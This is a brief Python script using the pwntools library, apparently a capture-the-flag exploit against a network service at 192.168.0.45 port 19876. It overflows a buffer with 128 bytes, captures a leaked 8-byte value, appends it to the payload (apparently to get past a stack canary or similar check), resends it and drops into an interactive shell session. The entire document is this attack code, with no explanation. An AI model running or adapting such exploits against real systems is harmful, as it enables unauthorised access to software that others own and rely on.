from pwn import *

p = remote("192.168.0.45", 19876)

payload = b"a"*128

p.recvuntil(b"> ")
p.sendline(payload)
p.recvuntil(b"\n")
leak = u64(p.recv(6) + b'\x00\x00')
print(hex(leak))

payload += p64(leak)

p.sendline(payload)
p.interactive()


